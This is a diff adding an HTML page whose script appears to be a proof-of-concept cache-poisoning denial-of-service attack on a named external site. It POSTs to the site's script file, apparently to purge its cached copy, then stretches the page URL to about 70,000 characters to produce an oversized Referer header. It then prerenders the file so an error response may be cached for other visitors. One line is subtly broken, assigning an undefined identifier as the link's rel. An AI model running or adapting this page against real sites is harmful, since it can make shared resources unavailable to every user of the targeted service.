@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+</head>
+<body>
+
+<script>
+var CS = "https://cors-anywhere.herokuapp.com/";
+
+
+PeticionPOST("https://fastframework.ga/ff.js", function(resp) {
+  alert("Removed Cached Resource from server");
+  alert("Server response:\n" + resp);
+
+  alert("Long url to create a big referrer"); 
+  history.replaceState(1,1,Array(7e4));
+  var link = document.createElement("link");
+  link.rel = prerender;
+  link.href = "https://fastframework.ga/ff.js";
+  document.body.appendChild(link);
+    
+}, "");
+
+
+function PeticionPOST(url, callback, parametrosCuerpo) {
+  var peticion = new XMLHttpRequest();
+  peticion.open("POST", url , true);
+  peticion.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  peticion.send(parametrosCuerpo);
+  peticion.onreadystatechange = function() {
+    if (peticion.readyState == 4) {
+      if (peticion.status == 0 || peticion.status == 200 || peticion.status == 404) {
+
+        callback(peticion.responseText);
+      } else {
+        alert("Status Code:" + peticion.status);
+      }
+    } else {
+      alert("Request Status:" + peticion.readyState);
+    }
+  }      
+}
+
+
+</script>
+</body>
+</html>
